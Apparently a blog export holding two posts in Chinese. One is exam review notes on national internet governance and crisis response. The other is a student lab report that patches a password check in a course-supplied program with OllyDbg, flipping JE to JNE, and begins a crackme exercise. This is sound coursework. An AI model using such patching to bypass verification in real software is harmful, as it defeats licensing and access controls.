<h2 id="第三节-各国网络信息管理制度和治理方法"><a href="#第三节-各国网络信息管理制度和治理方法" class="headerlink" title="第三节 各国网络信息管理制度和治理方法"></a><strong>第三节 各国网络信息管理制度和治理方法</strong></h2><p>1.罗马渊源和两大法系区别：<strong>法律渊源不同、诉讼程序不同、法律适用不同、法律分类不同、法律编纂不同</strong></p>
<p>大陆法系强调成文法作用，<strong>英美法系也称普通法系</strong>，基于以往判决的判例上逐步形成的</p>
<p>2.我国网络安全立法3个重点</p>
<p><strong>（一）现行网络安全法律体系</strong></p>
<p>网络法律体系：以传统法律为基础，以网络专门法律为补充</p>
<p><strong>（二）《网络安全法》是网络空间的基础性法律。</strong></p>
<p><strong>（选择）</strong>《网络安全法》确立了以下基本原则：<strong>网络空间主权原则、网络安全与信息化发展并重原则、共同治理原则</strong></p>
<blockquote>
<p><em>记住几个最，突出的</em></p>
</blockquote>
<p>2.美国</p>
<p>美国<strong>政府弱民间强</strong>，与我国相反</p>
<ul>
<li>网络舆情法律环境</li>
</ul>
<p>（1）参考博士论文</p>
<p>立法方面：<strong>由参、众两院组成</strong>的国会作为最高立法机关，对包括因特网在内的<strong>电信立法法案</strong>进行听证、辩论、表决，从而影响<strong>国家电信政策</strong>的制定，另外，国会也可通过一些非正式的方式，如控制预算、人事任命、立法威胁、公共舆论等来施加压力，影响政策的制定。</p>
<p>司法方面：区域法院、上诉法院和美国最高法院组成了美国的联邦司法体系，他们拥有针对<strong>电信管理机构</strong>进行监督，并解决其间纠纷的权力。</p>
<p>（2）美国还存在一些<strong>专门负责某个领域</strong>的管理事务，拥有<strong>一部分执行权和一部分准立法权和准司法权</strong>，直接对国会负责的相对独立的委员会。联邦通信委员会就是这样的一个专门针对美国的通信政策与通信产业的独立机构。它根据1934年<strong>通信法而成立</strong>，兼有立法、司法和行政执行职能，可以制定规章，仲裁争议，执行各项法规。在执行有关职责时，要受到联邦司法系统的制约，受法院监督。在美国的各种机构中，联邦通信委员会是对美国的通信和互联网产业最具影响力的机构。</p>
<ul>
<li>网络舆情政策</li>
</ul>
<p>1919年，奥利弗.霍姆斯大法官确立了著名的<strong>“明显而当前的危险”</strong>原则。</p>
<p>宪法第一修正案<strong>禁止普通立法对言论自由进行限制</strong></p>
<p>美国政府于1996年首次颁布了针对网络色情的<strong>《传播净化法案》</strong> </p>
<p><strong>美国公民自由联盟以美国政府违宪为由</strong>，起诉至费城法院，要求法院宣布该法案违宪、无效。<strong>费城法院裁决CDA违宪</strong>，美国政府<br>不服判决，上诉最高法院。经过长达1年的艰难辩论和审理，美国最高法院最终做出了否决CDA的<strong>历史性判决</strong></p>
<p><strong>事实上禁止了成年人依据宪法而享有的接受或发表言论的自由。</strong></p>
<p>美国政府认识到<strong>互联网</strong>也对国家信息安全构成了一定的威胁</p>
<p>国家信息安全指确保“国家行为体认为特定的<strong>信息基础设施</strong>、<strong>特定信息流动以及国家对于上述设施和信息的控制能力</strong>不面临威胁”。</p>
<p><strong>《爱国者法案》</strong>和国会在2002年通过的<strong>《国土安全法》</strong>将这种冲突在立法层面上推向高峰。</p>
<p>《爱国者法案》是“9.11”事件以后，美国为保障国家信息安全颁布的最为重要也争议最大的一部法律，<strong>主要针对在美国境内发生的(支持)恐怖主义的犯罪行为</strong></p>
<p>明确授权政府有关部门可以对公民进行<strong>跟踪和窃听</strong>，可以查阅公民的上网记录（谷歌浏览器30年）、私人信件和电子邮件等，以确定其是否支持或参与了恐怖主义活动；而<strong>《国土安全法》</strong>的最主要目标是实现各部门的<strong>信息共享</strong></p>
<ul>
<li>美国——网络自律及技术引导</li>
</ul>
<p>行业协会积极参与：政府和行业的沟通平台、美国计算机协会——网络伦理八项要求</p>
<p>倡导行业和用户自律：《一个星球，一个网络：因特网时代原则》、指导性立法主义</p>
<p>技术手段控制：实现对网络内容的过滤筛选、实现对用户隐私的保护</p>
<ul>
<li>美国——信息公开制度</li>
</ul>
<p>“9.11事件”爆发后，<strong>联邦紧急事务管理署网站</strong>便立即开设了专题栏目，第一时间发布了启动联邦应急响应计划的消息。</p>
<ul>
<li>美国——网络文化道德的管制</li>
<li>美国——网络匿名制</li>
</ul>
<p>网络匿名发言权保障了人们的言论自由<strong>（VK、PTT BBS网站）</strong></p>
<p>但同时也给<strong>追查滥用网络匿名</strong>进行违法犯罪活动的犯罪分子带来<strong>困难</strong></p>
<p><strong>政府无法直接介入监管，依赖于行业自律自治</strong></p>
<p>3.德国</p>
<p>德国——网络舆情政策：德国对网络言论采取的是“宪法的直接保护和特别立法的保护、限制相合”的方式；德国宪法《基本法》保障网络言论自由权利；<strong>1997年《多元媒体法》欧洲第一个全面规制网络内容的立法</strong></p>
<p>强制的民主——如果言论表达侵犯了其他的公民权利、公共秩序或者刑法规范，<strong>权力机关将限制公民的表达权利</strong></p>
<p>德国——信息公开制度</p>
<p><strong>重大突发事件信息的发布</strong>通常由总理和各部部长亲自出马举行发布会。</p>
<p>“回答记者和传媒提出的每一项问题”，形成了<strong>为记者服务、为媒体服务、为公众服务的传统</strong></p>
<p>2005年制定<strong>《信息自由法》</strong>，该法明确对公民享有的<strong>“政府信息普遍知情权”</strong>进行了界定，并针对电子政府和网络化的特点进一步完善了政府信息公开的渠道和方式</p>
<p>4.法国</p>
<p>“调控”时期、自动调控时期、共同调控时期</p>
<p>法国——《信息社会法案》</p>
<p>核心思想：从法律上明确每个人的权利与责任，保证网上的通信及交易自由和信息传播的安全可靠，努力实现信息社会的民主化。</p>
<p>主要包括以下几个方面：保障网上通信自由的同时明确每个人的权利与责任、对因特网上的域名实行规范化管理、文学艺术作品数字化与保护知识产权、提高电子商务的安全性和可靠性</p>
<p>法国——信息公开制度、逐步收紧、查理周刊事件之后</p>
<p>5.加拿大</p>
<p>非法信息：以法律为依据，按法律来制裁；攻击性信息：依赖用户与行业的自律来解决。</p>
<p><strong>同时辅以自律性道德规范与网络知识教育，并取得了较好的管理效果。</strong></p>
<p>加拿大——信息公开制度</p>
<p><strong>1994年，加拿大政府发布了《运用信息通信科技改革政府服务蓝图》——世界上第一份国家层次发布的利用信息通信技术角度全面进行政府改革的框架性文件。</strong></p>
<p>根据埃森哲每年对全球电子政务发展的调查研究，加拿大自2001年以来己连续多年在网络服务和电子政务成熟度方面名列第一</p>
<p>加拿大中央政府的CIO部门选择一些加拿大老百姓作为代表，为政府网站“政府在线” 提供协助</p>
<p>6.新加坡</p>
<p><strong>新加坡——世界上首个对网络进行立法管制的国家</strong></p>
<p>新加坡广播局——网络政策七大指导原则</p>
<p><strong>新加坡广电局、电影与出版物管理局、新加坡电影委员会</strong>三家机构合并为新加坡传媒发展局</p>
<p>新加坡——网络管制</p>
<p>国家互联网顾问委员会(NIAC)，由来自<strong>政府机构、业界、研究机构</strong>等各方面代表组成，<strong>专门为新加坡互联网</strong>的发展和管理而设置的咨询机构。</p>
<p>其职责是就互联网发展中出现的各种问题<strong>向政府提出参考建议，协助意见</strong>。政府制定有关的法律法规，及时收集社会各界对政府有关政策的反馈意见。</p>
<p>2003年1月，<strong>新加坡广电局、电影与出版物管理局、新加坡电影委员会三家机构合并为新加坡传媒发展局</strong>  (MDA)。由此，MDA成为网络内容的主管机构。</p>
<p>7.韩国</p>
<p><strong>韩国——第一个有专门的网络审查法规的国家</strong></p>
<p>韩国——网络实名制及监管教育</p>
<h2 id="第四节-大众对社会舆论的常见误区"><a href="#第四节-大众对社会舆论的常见误区" class="headerlink" title="第四节 大众对社会舆论的常见误区"></a><strong>第四节 大众对社会舆论的常见误区</strong></h2><p><strong>1.舆论相关内容（必考，大题）</strong></p>
<p>舆论：在我国<strong>多数专家学者也把舆论看成是意见</strong>，认为舆论是多数人对于某一事件有效的<strong>公共意见</strong>。是公众关于现实社会及社会中各种现象、问题所持有的信念、态度、意见和情绪表现的总和，具有<strong>相对的一致性、强烈程度和持续性</strong>，对社会发展及有关事态的进程产生影响，其中混杂着理智和非理智的成分。</p>
<p>社会舆论，<strong>是针对特定的现实客体</strong>，一定范围内的<strong>“多数人”基于一定的需要和利益</strong>，通过言语、非言语形式<strong>公开表达</strong>的态度、意见、要求、情绪，通过一定的传播途径，进行交流、碰撞、感染，整合而成的，具有强烈实践意向的表层集合意识，是“多数人”整体知觉和共同意志的外化。</p>
<p><strong>（必背）</strong>网络舆论，就是人民群众通过互联网了解国家事务，广泛、充分地交流和发表意见、建议，对国家政治、经济、法律、文化、教育、行政等活动进行褒贬与评价，即社会舆论在<strong>网络上的汇集</strong>。</p>
<p><strong>2.网络舆论与社会舆论的相互关系与区别（必考，大题）</strong></p>
<p><strong>（1）网络的特征使个体意识容易形成舆论</strong></p>
<p><strong>（2）网络舆论起于网络却源于现实</strong></p>
<p><strong>（3）网络舆论间接影响社会舆论</strong></p>
<p><strong>（4）网络舆论反作用于现实社会</strong></p>
<p>3.大众对社会舆论的常见误区：<strong>把大众传媒的言论、把民意、把众意或公意</strong>等同于社会舆论</p>
<h2 id="第五节-危机舆情应急应对"><a href="#第五节-危机舆情应急应对" class="headerlink" title="第五节 危机舆情应急应对"></a><strong>第五节 危机舆情应急应对</strong></h2><p>1.Builder和Banks于1991年提出的<strong>“人工社会”</strong>方法较早地<strong>采用计算机仿真的思想构建人工社会。</strong></p>
<p>2.ACP理论，王飞跃提出的，<strong>就是“人工社会-计算实验-平行执行”方法</strong>， 真实社会与人工社会之间是<strong>平行控制</strong>。</p>
<p>3.通常在三个不同的空间维度对紧急事故情况下的公众舆情进行采集<strong>（必考）</strong>：<strong>物理空间、信息空间、心理空间</strong>，将该模型称之为<strong>CPS物理信息心理综合空间分析框架。</strong></p>
<p>4.灾害预防及应急涉及</p>
<p>（1）多层级、多专业：国家级、省级、地市级、县级</p>
<p>（2）多类型、多信息：危险源、应急资源、基础设施</p>
<p>5.应急管理定义（大题）</p>
<ul>
<li><strong>应急管理</strong>是指政府及其他公共机构对突发事件的<strong>事前预防、事发应对、事中处置和善后恢复过程中</strong>，通过建立必要的应对机制，采取一系列的措施，应用科学、技术、规划与管理等手段，保障公众生命、健康和财产安全，维护社会稳定和谐与健康发展的有关活动。</li>
<li>我国的应急管理体系建设正式开始于2003年抗击“非典”时期。随着<strong>2006年1月8日国务院发布的《国家突发公共事件总体应急预案》出台</strong>，我国应急预案框架体系初步形成。第一部综合性应急法律《突发事件应对法》自2007年11月1日起施行。</li>
</ul>
<p>6.我国应急管理体系建设的核心<strong>“一案三制”：应急预案、应急管理体制、应急机制与法制</strong>。</p>
<p>7.突发事件</p>
<p>（1）2012年<strong>《中华人民共和国突发事件应对法》</strong>提出：指<strong>突然发生</strong>，造成或者可能造成严重社会危害，需要<strong>采取应急处置措施</strong>予以应对的<strong>自然灾害、事故灾害、公共卫生事件和社会安全事件。</strong></p>
<p>（2）公共安全领域的突发事件的主要特点有：<strong>突然发生、后果严重、程度重大、状态紧急</strong></p>
<p>6.公共安全管理系统是由<strong>公共安全管理者、管理对象</strong>组成，并由<strong>公共安全管理者</strong>负责<strong>控制</strong>的一个整体。</p>
<ul>
<li>公共安全管理系统、突发事件指挥系统、资源管理系统、通讯与信息管理系统、后勤保障系统。</li>
</ul>
<p>7.美国组织架构：美国自从911事件之后建立了国土安全部，到如今已形成了<strong>以国土安全部为中心</strong>，下分<strong>联邦、州、县、市、社区</strong>五个层次的应急和响应机构，通过实行<strong>统一管理，属地为主，分级响应，标准运行</strong>的机制，有效地应对各类突发的灾害事件。此外，日本在地震灾害方面的应急管理取得的成效也是值得各国借鉴和学习的</p>
<p>8.我国政府危机舆情应对的组织结构</p>
<ul>
<li><strong>国务院应急管理办公室</strong>是我国<strong>应急管理</strong>的<strong>最高行政管理机构</strong></li>
<li>省市区的应急办<strong>指挥</strong>属下的各市区的应急办，并<strong>协调</strong>不同城市或区域的厅局处的应急部门。</li>
<li>我国的应急管理机制较为有效并且在应对突发事件时已经取得了一定成效，第一部综合性应急法律<strong>《突发事件应对法》</strong>自2007年11月1日起施行</li>
</ul>
<p><strong>9.我国政府危机舆情应对工作流程（大题必考）</strong></p>
<p>突发事件的危机管理过程分为<strong>减灾、预备、反应和恢复</strong>四个阶段。</p>
<ul>
<li><strong>减灾</strong>是排在时间序列中最前面的，就是通过采取各种防范措施，尽量减少突发事件的形成机会，使其不出现或少出现。</li>
<li><strong>预备</strong>是在突发事件出现之前就做好各种准备工作，在那些虽然经过减灾的努力仍然无法避免的突发事件一旦出现时不至于措手不及，预备阶段包括突发事件的预警系统的建设、紧急应对人员的培训及必要的事前演习等。</li>
<li><strong>反应</strong>阶段是在突发事件出现以后及时采取紧急应对措施，启动在预备阶段事先制订好的预案，尽量控制其影响范围，将生命和财产的损失减少到最低限度。</li>
<li><strong>恢复</strong>阶段是在紧急应对行动之后，采取各种必要的措施消除突发事件给经济、社会造成的各种不良影响，恢复正常的社会秩序。</li>
</ul>
<p>10.危机响应中社交网络上的虚假新闻（大题推测）</p>
<ul>
<li>虚假新闻是指<strong>故意且可核实为虚假</strong>的新闻文章，而虚假新闻被恶意社交网络用户制造出来以后，经过普通社交网络用户的传播，却具有令人震慑的负面效果。随着多媒体技术的发展，新闻由单纯的文本类型向含有文本，图片以及视频等多种方式结合拓展，来吸引更多的读者。</li>
<li>然而虚假新闻也是利用这些特性来扭曲事实，误导读者，比如通过<strong>篡改图片或者修改人物名称，事件时间地点</strong>等来误导读者，传播虚假信息。我们大致可将虚假新闻图片分为两类，<strong>篡改图片和误导图片。</strong></li>
</ul>
<p>11.多模态虚假新闻识别</p>
<ul>
<li>国内外前沿研究表明，多模态属于现在AI研究的<strong>重点难点</strong>，其中利用了文本、图片、 视频、音频等各种维度的数据。</li>
<li>后面可能<strong>应用</strong>到此类业务的场景有：多模态识别虚假新闻、多模态识别色情、暴力、 涉政、威胁等新闻、多模态+情感分析等方向。</li>
<li><strong>图片被篡改、图文不符、图片过时</strong></li>
</ul>
<p>12.社交网络上的3种恶意用户，水军和僵尸</p>
<ul>
<li>迫切需要讨论在线社交媒体所反映出来的社交网络用户行为的本质科学问题：<strong>大规模信息传播过程中，用户行为特征的抽取、建模和分析。</strong></li>
<li>在线社交网络的<strong>便捷性，匿名性</strong>等特征也给恶意行为群体的形成与发展提供了有利条件。</li>
<li>研究者通常将用户群体分为<strong>正常用户和恶意用户：Spaml用户，Sybil女巫用户、谣言用户</strong>是恶意行为群体。</li>
</ul>
<p>13.社交网络上的虚假新闻检测</p>
<ul>
<li>单个用户的特征：个体特征是将<strong>单个</strong>用户的各项统计指标抽取出来，用于分析该特点用户<strong>可信度的一系列特征</strong>，主要包括用户的注册时间、用户名类型、年龄、性别、粉丝数、关注数、发布微博或推文数等。</li>
<li>群组特征：在信息传播过程中具有<strong>相似性</strong>的某个用户群体的<strong>整体特征</strong>，抽取该类特征时的一个基本的假设就是传播谣言的社区和传播真实消息的社区各不相同并且有不同的特点。群组特征通常是<strong>从个体特征聚合而来的</strong>，例如认证用户的比例、平均粉丝数等</li>
<li>基于社交内容特征的检测方法：通过捕捉新闻事件在社会媒体上传播过程中，不同用户通过转发和评论表达各自的观点和情感倾向时反映出来的重要信息来进行检测。这些信息主要有每条转发或评论推文的<strong>单个消息级特征</strong>（例如单条消息的主题信息）、群体转发某条消息产生<strong>聚合信息特征</strong>，以及这些信息<strong>在时间上</strong>的分布特征。</li>
<li>基于网络交互结构的特征：虚假新闻信息在社交网络上的传播可以形成结构特殊的<strong>转发传播树</strong>，另一方面参与传播的用户也潜在地隐含在一个用户社交网络中，通过抽取特征来描述这些关系网络就形成了<strong>基于社交网络交互结构的虚假新闻检测特征。</strong></li>
</ul>
<h1 id="开放大题"><a href="#开放大题" class="headerlink" title="开放大题"></a>开放大题</h1><p>1.历经十几年的探索，我国在互联网治理方面得到了不断的加强和完善，在一定程度上维护了互联网的健康与和谐发展。但随着时代的不断发展变化，我国的互联网治理中仍然存在着许多问题与不足，请写出其中最为突出的几点。（15分）</p>
<p><strong>一、 体制结构方面：协同机制不畅，权责壁垒依然存在</strong></p>
<p><strong>“金字塔”结构存在“纵向强、横向弱”的失衡、特设机构和平台的公众认知度与参与度不足、基层治理能力与资源不匹配</strong></p>
<p><strong>二、 立法方面：法律体系尚不健全，滞后性与模糊性凸显</strong></p>
<p><strong>基础性立法对主体权责界定仍显原则化、面对新兴业态，立法滞后性问题非常突出、立法过程中各利益相关方参与不足</strong></p>
<p><strong>三、 监管方面：方式传统，多元共治格局尚未形成</strong></p>
<p><strong>政府监管过度依赖行政命令和运动式执法、行业自律机制孱弱，内部监督形同虚设、第三方监督和社会监督渠道不畅通、保障不力</strong>：</p>
<p><strong>体制结构方面：优化互联网治理金字塔结构、明确金字塔各层级的职责和权力、加强宣传已特设的机构、平台，促全员参与</strong></p>
<p><strong>强化顶层协调机构的权威与能力</strong></p>
<p><strong>立法方面：针对互联网主体完善基础性立法（政府、企业、用户怎么做）、填补“互联网+”新兴领域的立法空白、加强法律与标准、技术的协同</strong></p>
<p><strong>监管方面：政府监管迈向“敏捷监管”与“智慧监管”、行业内部监督强化自律与标准约束、引入第三方监督与社会监督</strong></p>
<p>2.《网络安全法》是网络安全领域的基础性法律，目的在于建立网络安全各项基本法律制度。《个人信息保护法》主要在于确立网络用户个人信息权利，维护公众对网络的信心，请写出这两项法律任意一部至少三点你认为需要改进的地方。（针对一部法律即可，两部全写按第一部的答案给分）（10分）</p>
<p>《网络安全法》：加强个人信息保护、强化网络运营者的社会责任、允许使用临时通信措施、落实网络实名制规定</p>
<p><strong>关键信息基础设施（CII）范围界定不够清晰</strong>：法律对CII的认定标准较为原则化，导致在实践中哪些网络运营者应承担更严格的CII安全义务存在不确定性，影响法律适用的公平性和可预期性。</p>
<p><strong>对内部人员违规行为的责任追究偏弱</strong>：法律侧重于对运营者的整体处罚，但对引发数据泄露等安全事件的内部直接责任人员的个人法律责任规定不足，惩戒和震慑力度不够。</p>
<p><strong>部分条款滞后于新技术发展</strong>：面对云计算、物联网、人工智能等新业态，法律在数据分类分级、安全审计、算法安全等具体规则方面存在空白，难以有效覆盖新型网络安全风险。</p>
<p>《网络信息服务管理法》：规范经营范围、规范商业合作方式、明确服务分类、明确监督管理职责</p>
]]></content>
      <categories>
        <category>复习总结</category>
      </categories>
      <tags>
        <tag>网络空间安全治理</tag>
        <tag>期中复习</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验1：逆向破解初步</title>
    <url>/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="软件安全第一次实验报告"><a href="#软件安全第一次实验报告" class="headerlink" title="软件安全第一次实验报告"></a>软件安全第一次实验报告</h2><h3 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h3><p>1.读懂实验所给的用于密码验证的小程序，改变程序的运行路线，系统：Windows 2000~Windows 11、wsl、Linux皆可；工具：VS、gdb、Ollydbg，x96dbg等。<strong>（以上记作实验一）</strong></p>
<p>2.根据在附件&#x2F;test 目录下的源码；学习用调试工具调试密码验证小程序；通过修改汇编语句来修改程序的判断条件，改变程序的运行路线。<strong>（以上记作实验二）</strong></p>
<p>3.根据在附件&#x2F;crackme目录下的文件，修改程序代码的方式绕过crackme.exe的密码验证逻辑，至少采用2种破解方式方法，并提交破解后的程序。<strong>（以上记作实验三）</strong></p>
<p>4.报告要求</p>
<p>请详述修改过程；实验结果需要截图证明；绘出程序运行的结构图，以及修改原理的图示（通过程序运行的结构图）。</p>
<h3 id="实验一步骤与结果"><a href="#实验一步骤与结果" class="headerlink" title="实验一步骤与结果"></a>实验一步骤与结果</h3><h4 id="（一）读懂实验所给的用于密码验证的小程序"><a href="#（一）读懂实验所给的用于密码验证的小程序" class="headerlink" title="（一）读懂实验所给的用于密码验证的小程序"></a>（一）读懂实验所给的用于密码验证的小程序</h4><p>使用VC打开test.c，对密码验证小程序代码分析如下：</p>
<p>1.程序定义了一个字符串常量PASSWORD，其值为1234567。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img1.png" alt="图1"></p>
<p>2.程序定义了一个verify_password()函数，函数传入参数为一个字符数组，返回值为一个整型变量。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img2.png" alt="图2"></p>
<p>此函数所实现的功能为：将传入的字符串与PASSWORD比较，返回比较结果authenticated。若authenticated&#x3D;0则字符串不同，验证失败；若authenticated&#x3D;1则字符串相同，验证成功。</p>
<p>3.主函数中，由while(1)控制不断循环，每次循环中首先输入一个字符串password，再将password作为参数输入verify_password函数进行验证。若验证成功，则输出“Congratulation! You have passed the verification!\n”并跳出循环、结束程序；若验证失败，则输出“incorrect password!\n\n”，开始下一轮循环。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img3.png" alt="图3"></p>
<p>4.生成工程</p>
<p>（1）在VC中，点击File-&gt;new-&gt;Projects-&gt;Win32 Console Application，右上角设置好project的名称和存放路径。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img4.png" alt="图4"></p>
<p>（2）点击OK-&gt;An empty project-&gt;Finish</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img5.png" alt="图5"></p>
<p>（3）之后再new-&gt;Files-&gt;C++ Source File，右侧设定好添加到的项目(我们刚才新建的项目)，文件名和路径。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img6.png" alt="图6"></p>
<p>（4）完成新建文件后，在新建的文件下编写或复制刚才我们看到的main程序， 然点击右上的红色感叹号执行。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img7.png" alt="图7"></p>
<p>5.运行程序，验证以上分析。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img8.png" alt="图8"></p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img9.png" alt="图9"></p>
<p>由运行结果可知，当所输入的字符串不是PASSWORD的值1234567时，输出“incorrect password!\n\n”并开始下一次循环，直至输入正确密码1234567时才输出“Congratulation! You have passed the verification!\n”并跳出循环、结束程序。</p>
<h4 id="（二）编写程序，改变程序的运行路线"><a href="#（二）编写程序，改变程序的运行路线" class="headerlink" title="（二）编写程序，改变程序的运行路线"></a>（二）编写程序，改变程序的运行路线</h4><p>用python编写密码验证小程序，程序代码如下：</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img10.png" alt="图10"></p>
<p>同样使用while True不断循环，其中使用了两层循环，分别判断用户名和密码是否正确。外层循环为——若用户名正确，则开始内层循环验证密码；若用户名错误，则用户重新输入用户名。内层循环为——若密码正确，则验证成功跳出循环；若密码错误，则验证失败用户重新输入密码。</p>
<p>2.程序可以实现的功能为：当用户同时输入正确的用户名和正确密码时，才能够通过验证。</p>
<p>3.运行程序，测试结果如下图所示：</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img11.png" alt="图11"></p>
<p>输入错误用户名时，输出“incorrect username!\n”并继续进入下一次循环；输入正确用户名时，输出“please input password: ”，用户输入密码。</p>
<p>输入错误密码时，输出“incorrect password!\n”并继续进入下一次循环；输入正确密码时，输出“Congratulation! You have passed the verification!\n”并跳出双层循环、结束程序。由此可知，该程序可以正确完成密码验证。</p>
<h3 id="实验二步骤与结果"><a href="#实验二步骤与结果" class="headerlink" title="实验二步骤与结果"></a>实验二步骤与结果</h3><h4 id="（一）使用Ollydbg调试密码验证小程序，修改汇编语句以修改程序判断条件"><a href="#（一）使用Ollydbg调试密码验证小程序，修改汇编语句以修改程序判断条件" class="headerlink" title="（一）使用Ollydbg调试密码验证小程序，修改汇编语句以修改程序判断条件"></a>（一）使用Ollydbg调试密码验证小程序，修改汇编语句以修改程序判断条件</h4><p>1.运行Ollydbg.exe，选择我们刚刚编译生成的test.exe文件</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img12.png" alt="图12"></p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img13.png" alt="图13"></p>
<p>2.这个exe文件在我们项目文件夹下的Debug文件夹下</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img14.png" alt="图14"></p>
<p>3.点击Ollydbg左上角运行按钮，开始运行程序。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img15.png" alt="图15"></p>
<p>4.尝试输入几个错误密码，如“12”、“123”。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img16.png" alt="图16"></p>
<p>5.可以看到Ollydbg的调试走到了程序判断部分，分析此部分代码：</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img17.png" alt="图17"></p>
<p>可以看到“incorrect password!”和“Congratulations! You have passed the verification!” 两个字符串。</p>
<p>由此可知，程序004010F5处语句即为跳转逻辑语句，JE即为相等时跳转。因此，为了破解此密码验证小程序，将此处的跳转条件JE修改为JNE，即可在输入错误密码时通过验证。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img18.png" alt="图18"></p>
<p>6.修改后可以看到，此语句的操作码由74（JE）改为了75（JNE）。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img19.png" alt="图19"></p>
<p>7.验证修改后的程序。修改后运行程序，输入正确密码“1234567”发现程序输出“incorrect password!”，而随意输入错误密码时则通过验证，说明已成功修改程序。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img20.png" alt="图20"></p>
<h4 id="（二）程序运行结构图及修改原理图示"><a href="#（二）程序运行结构图及修改原理图示" class="headerlink" title="（二）程序运行结构图及修改原理图示"></a>（二）程序运行结构图及修改原理图示</h4><p>1.程序运行结构图：</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img21.png" alt="图21"></p>
<p>2.修改原理图示：</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img22.png" alt="图22"></p>
<h4 id="（三）实验结论"><a href="#（三）实验结论" class="headerlink" title="（三）实验结论"></a>（三）实验结论</h4><p>简单的判断密码字符串是否相同的跳转逻辑代码对于动态调试的防御能力较弱，可以通过修改汇编语句较容易地改变判断逻辑，实现程序破解。因此我们在设计程序时，要充分考虑如何设计逻辑以抵御动态调试等破解方法，以保证软件安全。</p>
<p>我们只需修改一个小小的跳转条件即可实现对程序的破解，输入错误的密码提示正确，正确的密码反而提示错误。通过这次实验，我对软件安全有了更深刻的认识，也意识到软件存在着极大的安全隐患，软件安全是软件研究中一个重要方面，我们应该通过软件安全这门课程学习更多安全知识，以更好地维护网络安全。在今后的学习和工作中，编写程序时应该考虑到攻击者会进行反汇编以及修改，最好对代码进行一定的混淆。</p>
<h3 id="实验三步骤与结果"><a href="#实验三步骤与结果" class="headerlink" title="实验三步骤与结果"></a>实验三步骤与结果</h3><h4 id="（一）运行程序初步尝试"><a href="#（一）运行程序初步尝试" class="headerlink" title="（一）运行程序初步尝试"></a>（一）运行程序初步尝试</h4><p>1.首先双击crackme.exe运行程序，程序界面如下：</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img23.png" alt="图23"></p>
<p>2.尝试在用户名及密码未输入的情况下点击确定，发现弹出窗口提示“请输入用户名！”“请输入密码！”。由此可知，程序中设置了判断用户名及密码是否为空的代码逻辑。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img24.png" alt="图24"></p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img25.png" alt="图25"></p>
<p>3.随意输入用户名“222”和密码“222”点击注册后，弹窗提示“注册失败！”。</p>
<p><img src="/2025/10/09/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1/img26.png" alt="图26"></p>
